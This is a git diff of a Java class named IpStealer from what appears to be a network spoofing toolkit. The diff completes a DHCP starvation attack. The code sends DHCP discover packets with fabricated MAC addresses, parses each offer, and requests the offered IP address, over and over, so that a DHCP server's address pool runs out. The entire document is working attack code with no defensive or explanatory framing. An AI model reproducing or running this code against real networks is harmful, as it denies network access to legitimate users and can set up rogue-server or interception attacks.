@@ -12,6 +12,7 @@ import jpcap.packet.UDPPacket;
 
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
+import org.bitducks.spoofing.core.rules.DHCPRule;
 import org.bitducks.spoofing.util.Constants;
 import org.dhcp4java.DHCPConstants;
 import org.dhcp4java.DHCPPacket;
@@ -20,6 +21,12 @@ import org.dhcp4java.DHCPResponseFactory;
 
 public class IpStealer extends Service {
 	private int macAddr = 0;
+	
+	public IpStealer() {
+		
+		this.getPolicy().addRule(new DHCPRule());
+		
+	}
 
 	@Override
 	public void run() {
@@ -29,8 +36,11 @@ public class IpStealer extends Service {
 		
 		UDPPacket packet = null;
 		while ((packet = (UDPPacket)this.getNextBlockingPacket()) != Packet.EOF) {
-			proceedDHCPResponse(packet);
-			this.doDiscover();
+			//System.out.println("Got packet " + packet);
+			if (proceedDHCPOffer(packet)) {
+				// Send another if the packet was a DHCPOffer
+				this.doDiscover();
+			}
 		}
 		
 	}
@@ -55,12 +65,14 @@ public class IpStealer extends Service {
 		
 		DHCPPacket discover = new DHCPPacket();
 		discover.setOp(DHCPConstants.BOOTREQUEST);
+		discover.setOptionAsByte(DHCPConstants.DHO_DHCP_MESSAGE_TYPE, DHCPConstants.DHCPDISCOVER);
+		discover.setHlen((byte) 6);
+		discover.setChaddr(this.getMacAddr());
+		discover.setXid( (new Random()).nextInt() );
 		 
 		udpDiscover.data = discover.serialize();
 		
 		Server.getInstance().sendPacket(udpDiscover);
-		
-		System.out.println("Dhcp discovery sended");
 	}
 	
 	/**
@@ -78,7 +90,7 @@ public class IpStealer extends Service {
 				false, 
 				false, 
 				0, 
-				(new Random()).nextInt(),	// Identifier
+				0, //(new Random()).nextInt(),	// Identifier
 				64, 						// TTL
 				IPPacket.IPPROTO_UDP,  		// Protocol
 				source, 
@@ -89,25 +101,75 @@ public class IpStealer extends Service {
 		//set frame type as IP
 		ether.frametype = EthernetPacket.ETHERTYPE_IP;
 		//set source and destination MAC addresses
-		ByteBuffer buf = ByteBuffer.allocate(6);
-		buf.put((byte)0x00);
-		buf.put((byte)0x00);
-		buf.putInt(this.macAddr);
-		
-		ether.src_mac = buf.array();
+
+		ether.src_mac = this.getMacAddr();
 		ether.dst_mac =  Constants.BROADCAST;
 		
 		//set the datalink frame of the packet p as ether
 		packet.datalink = ether;
 	}
 	
+	private byte[] getMacAddr() {
+		ByteBuffer buf = ByteBuffer.allocate(6);
+		buf.put((byte)0x00);
+		buf.put((byte)0x00);
+		buf.putInt(this.macAddr);
+		
+		return buf.array();
+	}
+	
 	/**
 	 * Proceed the response from the DHCP Server.
 	 * DHCP Ack are not supported
+	 * Return true if the the packet was a DHCPOffer
 	 * @param packet
 	 */
-	private void proceedDHCPResponse(UDPPacket packet) {
+	private boolean proceedDHCPOffer(UDPPacket packet) {
 		
+		DHCPPacket offer = DHCPPacket.getPacket(packet.data, 0, packet.data.length, false);
+		if (!this.isDHCPOffer(offer)) {
+			// If it is not an offer
+			return false;
+		}
+		
+		
+		System.out.println("Offer " + offer.getYiaddr());
+		
+		
+		doDHCPRequest(offer);
+		
+		// This is an offer
+		return true;
+	}
+	
+	private void doDHCPRequest(DHCPPacket offer) {
+		
+		UDPPacket udpDRequest = new UDPPacket(68, 67);
+		
+		try {
+			this.setHeader(udpDRequest,
+					InetAddress.getByAddress(Constants.NO_IP),
+					InetAddress.getByAddress(Constants.BROADCAST_IP));
+		} catch (UnknownHostException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		
+		DHCPPacket request = new DHCPPacket();
+		request.setOp(DHCPConstants.BOOTREQUEST);
+		request.setOptionAsByte(DHCPConstants.DHO_DHCP_MESSAGE_TYPE, DHCPConstants.DHCPREQUEST);
+		request.setHlen((byte) 6);
+		request.setChaddr(this.getMacAddr());
+		request.setXid( offer.getXid() );
+		request.setOptionAsInetAddress(DHCPConstants.DHO_DHCP_REQUESTED_ADDRESS, offer.getYiaddr());
+	
+		udpDRequest.data = request.serialize();
+		
+		Server.getInstance().sendPacket(udpDRequest);
+	}
+	
+	private boolean isDHCPOffer(DHCPPacket packet) {	
+		return (packet.getOptionAsByte(DHCPConstants.DHO_DHCP_MESSAGE_TYPE) == DHCPConstants.DHCPOFFER);
 	}
 
 }
